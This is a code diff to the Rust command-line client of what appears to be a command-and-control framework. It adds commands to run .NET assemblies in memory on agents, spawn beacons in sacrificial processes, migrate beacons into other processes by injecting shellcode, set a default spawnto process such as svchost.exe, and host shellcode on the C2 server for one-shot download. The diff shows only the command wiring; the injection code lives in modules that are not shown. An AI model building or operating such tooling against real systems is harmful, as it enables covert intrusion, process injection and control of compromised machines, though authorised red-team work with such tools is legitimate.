@@ -11,6 +11,7 @@ use reqwest::blocking::Client;
 use crate::build::{Format, Os};
 
 mod agent;
+mod assembly;
 mod bof;
 mod build;
 mod inject;
@@ -237,6 +238,9 @@ enum Cmd {
         /// Encrypt shellcode with AES-256-GCM (shellcode format only)
         #[arg(long)]
         encrypt: bool,
+        /// Upload shellcode to the C2 server and print a one-shot download URL (shellcode format only)
+        #[arg(long)]
+        host: bool,
     },
 
     /// Start reverse SOCKS5 listener for an agent
@@ -255,6 +259,21 @@ enum Cmd {
 
     /// List active reverse SOCKS5 listeners
     SocksList,
+
+    /// Execute .NET assembly in-memory on an agent
+    #[command(trailing_var_arg = true)]
+    ExecuteAssembly {
+        /// Agent ID or alias
+        agent: String,
+        /// Local path to .NET assembly (EXE)
+        assembly_path: String,
+        /// Run in agent process (default: spawn sacrificial process)
+        #[arg(long)]
+        inline: bool,
+        /// Arguments passed to Main(string[] args)
+        #[arg(num_args = 0.., allow_hyphen_values = true)]
+        args: Vec<String>,
+    },
 
     /// Execute a Beacon Object File (BOF) on an agent
     Bof {
@@ -296,6 +315,35 @@ enum Cmd {
         /// Override spawnto executable (default: agent config or svchost.exe)
         #[arg(long)]
         spawn_exe: Option<String>,
+    },
+
+    /// Spawn a new beacon in the spawnto process
+    Spawn {
+        /// Agent ID or alias
+        agent: String,
+        /// Local path to beacon shellcode file
+        shellcode_path: String,
+        /// Override spawnto executable
+        #[arg(long)]
+        spawn_exe: Option<String>,
+    },
+
+    /// Migrate beacon to another process (inject + exit current)
+    Migrate {
+        /// Agent ID or alias
+        agent: String,
+        /// Target process ID
+        pid: u32,
+        /// Local path to beacon shellcode file
+        shellcode_path: String,
+    },
+
+    /// Set default spawnto process on agent
+    Spawnto {
+        /// Agent ID or alias
+        agent: String,
+        /// Executable path on target (e.g. C:\Windows\System32\svchost.exe)
+        path: String,
     },
 
     /// List active C2 listeners
@@ -419,7 +467,13 @@ pub fn dispatch(
             name,
             note,
             encrypt,
-        } => build::cmd_build_agent(os, format, alias, c2_url, profile, shared_token, output_dir, name, note, encrypt)?,
+            host,
+        } => build::cmd_build_agent(&ctx, os, format, alias, c2_url, profile, shared_token, output_dir, name, note, encrypt, host)?,
+
+        // --- execute-assembly ---
+        Cmd::ExecuteAssembly { agent, assembly_path, inline, args } => {
+            assembly::cmd_execute_assembly(&ctx, &agent, &assembly_path, args, inline)?
+        }
 
         // --- bof ---
         Cmd::Bof { agent, bof_file, args } => bof::cmd_bof(&ctx, &agent, &bof_file, args.as_deref())?,
@@ -433,6 +487,15 @@ pub fn dispatch(
         }
         Cmd::SpawnInject { agent, shellcode_path, spawn_exe } => {
             inject::cmd_spawn_inject(&ctx, &agent, &shellcode_path, spawn_exe.as_deref())?
+        }
+        Cmd::Spawn { agent, shellcode_path, spawn_exe } => {
+            inject::cmd_spawn(&ctx, &agent, &shellcode_path, spawn_exe.as_deref())?
+        }
+        Cmd::Migrate { agent, pid, shellcode_path } => {
+            inject::cmd_migrate(&ctx, &agent, pid, &shellcode_path)?
+        }
+        Cmd::Spawnto { agent, path } => {
+            inject::cmd_spawnto(&ctx, &agent, &path)?
         }
 
         // --- socks ---
